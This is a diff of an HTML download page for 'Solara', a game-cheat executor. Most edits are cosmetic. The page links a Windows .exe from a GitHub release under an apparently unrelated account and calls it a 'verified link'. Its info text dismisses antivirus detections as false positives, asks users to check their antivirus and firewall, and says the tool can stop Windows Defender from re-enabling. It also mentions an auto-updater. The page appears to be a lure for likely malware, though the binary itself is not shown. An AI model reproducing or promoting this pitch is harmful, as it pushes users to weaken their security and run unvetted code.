@@ -7,12 +7,11 @@
     <link rel="icon" type="image/png" href="/favicon-v2.png">
     <link rel="stylesheet" href="/output.css">
     <style>
-        /* Убираем дефолтную рамку фокуса */
         a:focus, button:focus {
             outline: none !important;
         }
 
-        /* ===== Шапка (точно как на главной) ===== */
+        /* ===== Шапка (как на главной) ===== */
         .header-nav {
             display: grid;
             grid-template-columns: 1fr auto 1fr;
@@ -84,7 +83,7 @@
             box-shadow: 0 0 8px #34d399;
         }
 
-        /* Адаптив шапки на мобилках */
+        /* Адаптив шапки */
         @media (max-width: 768px) {
             .header-nav {
                 display: flex;
@@ -108,20 +107,17 @@
             }
         }
 
-        /* Стили карточек Solara */
-        .glass {
-            background: #0f0f14;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 16px;
-            transition: all 0.35s ease;
-        }
+        /* Кнопка Download (как в твоём примере) */
         .btn-tg {
             display: block;
+            width: 100%;
             background: #2563eb;
-            color: white;
+            color: #ffffff;
             font-weight: 700;
+            font-size: 14px;
             text-transform: uppercase;
-            padding: 12px 24px;
+            letter-spacing: 0.05em;
+            padding: 14px 24px;
             border-radius: 10px;
             border: 1px solid rgba(255, 255, 255, 0.15);
             box-shadow: 0 4px 14px rgba(37, 99, 235, 0.35);
@@ -132,13 +128,21 @@
         .btn-tg:hover {
             background: #3b82f6;
             box-shadow: 0 6px 20px rgba(59, 130, 246, 0.5);
+            opacity: 0.95;
+        }
+
+        /* Карточки */
+        .glass {
+            background: #0f0f14;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
         }
     </style>
 </head>
 <body class="p-6 bg-[#050507] text-slate-300">
 <div class="max-w-4xl mx-auto">
 
-    <!-- ===== HEADER (точно как на главной) ===== -->
+    <!-- HEADER -->
     <header class="header-nav">
         <div style="display: flex; align-items: center;">
             <div class="nav-toggle">
@@ -159,27 +163,31 @@
         </div>
     </header>
 
-    <!-- Контент страницы -->
-    <div class="space-y-6"> 
-        <div class="glass p-6 rounded-2xl border border-[#222] text-center bg-[#0b0d14]">
+    <!-- Контент -->
+    <div class="space-y-6">
+
+        <!-- Download блок -->
+        <div class="glass p-6 rounded-2xl border border-[#222] text-center">
             <h2 class="text-xl font-bold text-white mb-4">Download Solara</h2>
             <a href="https://github.com/antonkoval200koval-collab/wakeupfilfy/releases/download/1.1/SolaraV3.exe" 
                target="_blank" 
                rel="nofollow noopener noreferrer" 
-               class="btn-tg w-full">
+               class="btn-tg">
                 Download PC
             </a>
             <p class="text-[10px] text-gray-500 mt-3 uppercase tracking-wider">
                 Verified link from GitHub
             </p>
         </div>
-            
-        <div class="glass p-6 rounded-2xl border border-[#222] text-center bg-[#0b0d14]">
+
+        <!-- Описание -->
+        <div class="glass p-6 rounded-2xl border border-[#222] text-center">
             <img src="https://obj.wearedevs.net/images/software/solara/solara-011026.webp" class="h-20 w-20 mx-auto rounded-xl mb-4" alt="Solara">
             <p class="text-sm text-gray-400">Free and keyless executor - The first & best external executor after Hyperion.</p>
         </div>
 
-        <div class="glass p-8 rounded-2xl border border-gray-800 bg-[#0b0d14]">
+        <!-- General Info -->
+        <div class="glass p-8 rounded-2xl border border-gray-800">
             <h3 class="text-lg font-bold text-white mb-4">General Info</h3>
             <ul class="text-sm text-gray-500 space-y-2 list-disc pl-5">
                 <li>Check anti-virus/firewall if you can't Download! Due to the nature of exploits (Obfuscation, game manipulation, etc), they're falsely marked as viruses/malware. This tool may reliably prevent Windows Defender from automatically turning itself back on.</li>
@@ -190,12 +198,13 @@
             </ul>
         </div>
 
-        <div class="bg-gray-900 border border-gray-800 p-4 rounded-lg mt-4 text-sm text-gray-500">
+        <!-- Last update -->
+        <div class="bg-gray-900 border border-gray-800 p-4 rounded-lg text-sm text-gray-500">
             <p><strong>🔄 Last update:</strong> September 24</p>
             <p class="mt-1 italic">Note: Most of our tools feature an auto-updater. Even if the date above is older, the software will check for the latest files upon launch.</p>
         </div>
-    </div>
 
+    </div>
 </div>
 </body>
 </html>
